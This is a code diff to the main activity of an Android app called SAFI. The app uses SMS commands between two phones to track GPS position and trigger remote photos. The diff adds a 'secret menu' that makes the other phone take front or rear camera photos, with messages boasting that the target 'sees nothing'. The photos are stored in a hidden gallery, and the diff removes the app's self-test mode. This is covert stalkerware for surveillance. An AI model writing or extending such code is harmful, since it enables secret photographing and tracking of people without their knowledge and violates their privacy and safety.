@@ -8,10 +8,10 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.Environment
 import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Log
+import android.view.View
 import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
@@ -54,7 +54,6 @@ class MainMapActivity : AppCompatActivity() {
         private const val REQUEST_OVERLAY = 1002
         private const val REQUEST_BATTERY_OPTIM = 1003
         private const val REQUEST_CAMERA_PERM = 1004
-        private const val REQUEST_STORAGE_PERM = 1005
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -75,6 +74,7 @@ class MainMapActivity : AppCompatActivity() {
         initGPS()
         initButtons()
         
+        // ✅ Demander TOUTES les permissions D'ABORD
         if (!hasAllPermissions()) {
             showPermissionExplanation()
         } else {
@@ -103,9 +103,7 @@ class MainMapActivity : AppCompatActivity() {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS,
             Manifest.permission.INTERNET,
-            Manifest.permission.CAMERA,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            Manifest.permission.CAMERA
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             needed.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -121,8 +119,7 @@ class MainMapActivity : AppCompatActivity() {
             .setMessage("SAFI a besoin des permissions suivantes :\n\n" +
                 "📍 Position GPS — pour envoyer/recevoir votre position\n" +
                 "📨 SMS — pour communiquer entre les deux téléphones\n" +
-                "📷 Caméra — pour prendre des photos à distance\n" +
-                "💾 Stockage — pour sauvegarder les photos dans la galerie\n\n" +
+                "📷 Caméra — pour prendre des photos à distance\n\n" +
                 "Cliquez sur OK pour accorder les permissions.")
             .setPositiveButton("OK") { _, _ ->
                 requestAllPermissions()
@@ -139,9 +136,7 @@ class MainMapActivity : AppCompatActivity() {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS,
             Manifest.permission.INTERNET,
-            Manifest.permission.CAMERA,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            Manifest.permission.CAMERA
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             needed.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -164,7 +159,7 @@ class MainMapActivity : AppCompatActivity() {
                 AlertDialog.Builder(this)
                     .setTitle("⚠️ Permissions manquantes")
                     .setMessage("Sans les permissions, SAFI ne peut pas fonctionner correctement.\n" +
-                        "Accorde TOUTES les permissions dans les paramètres de l'application.")
+                        "Accorde toutes les permissions dans les paramètres de l'application.")
                     .setPositiveButton("Paramètres") { _, _ ->
                         val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                         intent.data = Uri.parse("package:$packageName")
@@ -282,13 +277,10 @@ class MainMapActivity : AppCompatActivity() {
     private fun showSecretMenu() {
         val otherNum = getOtherNumber() ?: return
         
-        val isSelf = isMyNumber(otherNum)
-        val selfSuffix = if (isSelf) " (TEST — MOI-MÊME)" else ""
-        
         val options = arrayOf(
-            "📸 Prendre photo AVANT$selfSuffix",
-            "📸 Prendre photo ARRIÈRE$selfSuffix",
-            "🖼️ Ouvrir dossier photos dans la Galerie",
+            "📸 Prendre photo AVANT à distance",
+            "📸 Prendre photo ARRIÈRE à distance",
+            "🖼️ Galerie cachée des photos",
             "❌ Fermer le menu"
         )
 
@@ -297,44 +289,35 @@ class MainMapActivity : AppCompatActivity() {
             .setItems(options) { _, which ->
                 when (which) {
                     0 -> {
-                        if (checkCameraPermission() && checkStoragePermission()) {
-                            if (isSelf) {
-                                tvStatus.text = "🧪 MODE TEST — Photo AVANT en cours..."
-                                CameraCaptureService.takePhoto(this, useFront = true)
-                            } else {
-                                sendSms(otherNum, Commands.REQUEST_PHOTO_FRONT)
-                                tvStatus.text = "📸 Demande photo AVANT envoyée à $otherNum"
-                            }
+                        if (checkCameraPermission()) {
+                            sendSms(otherNum, Commands.REQUEST_PHOTO_FRONT)
+                            tvStatus.text = "📸 Demande photo AVANT envoyée à $otherNum — Invisible pour lui !"
+                            Toast.makeText(this, "📸 Photo avant demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
                         } else {
-                            Toast.makeText(this, "⚠️ Accorde les permissions Caméra + Stockage d'abord !", Toast.LENGTH_LONG).show()
+                            requestCameraPermission()
                         }
                     }
                     1 -> {
-                        if (checkCameraPermission() && checkStoragePermission()) {
-                            if (isSelf) {
-                                tvStatus.text = "🧪 MODE TEST — Photo ARRIÈRE en cours..."
-                                CameraCaptureService.takePhoto(this, useFront = false)
-                            } else {
-                                sendSms(otherNum, Commands.REQUEST_PHOTO_BACK)
-                                tvStatus.text = "📸 Demande photo ARRIÈRE envoyée à $otherNum"
-                            }
+                        if (checkCameraPermission()) {
+                            sendSms(otherNum, Commands.REQUEST_PHOTO_BACK)
+                            tvStatus.text = "📸 Demande photo ARRIÈRE envoyée à $otherNum — Invisible pour lui !"
+                            Toast.makeText(this, "📸 Photo arrière demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
                         } else {
-                            Toast.makeText(this, "⚠️ Accorde les permissions Caméra + Stockage d'abord !", Toast.LENGTH_LONG).show()
+                            requestCameraPermission()
                         }
                     }
                     2 -> {
-                        openPhotosInGallery()
+                        startActivity(Intent(this, HiddenGalleryActivity::class.java))
                     }
                 }
             }
             .show()
     }
 
-
     fun onPhotoReceived(photoFile: File) {
         runOnUiThread {
-            tvStatus.text = "✅ PHOTO SAUVEGARDÉE !\n→ ${photoFile.name}"
-            Toast.makeText(this, "✅ Photo dans Galerie → dossier SAFI_Photos !", Toast.LENGTH_LONG).show()
+            tvStatus.text = "📸 Photo reçue ! → ${photoFile.name}"
+            Toast.makeText(this, "📸 Nouvelle photo dans la galerie cachée !", Toast.LENGTH_LONG).show()
         }
     }
 
@@ -342,8 +325,8 @@ class MainMapActivity : AppCompatActivity() {
         return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
     }
 
-    private fun checkStoragePermission(): Boolean {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+    private fun requestCameraPermission() {
+        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQUEST_CAMERA_PERM)
     }
 
     private fun getOtherNumber(): String? {
@@ -496,30 +479,12 @@ class MainMapActivity : AppCompatActivity() {
     override fun onPause() {
         super.onPause()
         mapView.onPause()
+        instance = null
     }
 
     override fun onDestroy() {
         testRunnable?.let { testHandler?.removeCallbacks(it) }
         super.onDestroy()
+        instance = null
     }
-
-    private fun openPhotosInGallery() {
-        try {
-            val safiDir = File(getExternalFilesDir(null), "SAFI_Photos")
-            if (!safiDir.exists()) safiDir.mkdirs()
-            val chemin = safiDir.absolutePath
-            AlertDialog.Builder(this)
-                .setTitle("📂 Dossier SAFI_Photos")
-                .setMessage("Photos sauvegardées dans :\n\n$chemin\n\n→ Fichiers → Stockage interne → Android → data → com.safi.smstracker → files → SAFI_Photos")
-                .setPositiveButton("OK", null)
-                .show()
-        } catch (e: Exception) {
-            AlertDialog.Builder(this)
-                .setTitle("📂 Chemin")
-                .setMessage("Stockage interne → Android → data → com.safi.smstracker → files → SAFI_Photos")
-                .setPositiveButton("OK", null)
-                .show()
-        }
-    }
-
 }
